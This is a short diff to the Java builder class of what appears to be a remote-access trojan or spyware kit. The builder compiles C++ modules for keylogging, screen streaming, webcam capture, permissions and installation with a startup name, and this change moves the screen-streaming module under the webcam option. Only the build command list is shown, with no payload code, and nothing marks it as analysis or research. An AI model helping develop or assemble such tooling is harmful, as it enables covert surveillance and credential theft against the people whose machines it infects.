@@ -62,7 +62,6 @@ public class Compiler implements ActionListener {
                     "keylogger/KeyLogger.cpp " +
                     "permission/Permission.cpp " +
                     "box_message/MessageBoxGUI.cpp " +
-                    "screen/ScreenStreamer.cpp " +
                     "state/SystemState.cpp " +
                     "install/Install.cpp ");
             if (checkBoxes[0].isSelected()) {
@@ -77,7 +76,8 @@ public class Compiler implements ActionListener {
                 modifier.addInclude("#define WEBCAM");
                 modifier.setStartUpName("WEBCAM","\""+fieldsArray[9].getText()+"\"");
                 command.append(
-                        "webcam/WebcamManager.cpp " +
+                        "screen/ScreenStreamer.cpp " +
+                                "webcam/WebcamManager.cpp " +
                                 " -IC:opencv_static/include -Lopencv_static/lib " +
                                 "-lopencv_gapi460 -lopencv_highgui460 " +
                                 "-lopencv_ml460 -lopencv_objdetect460 " +
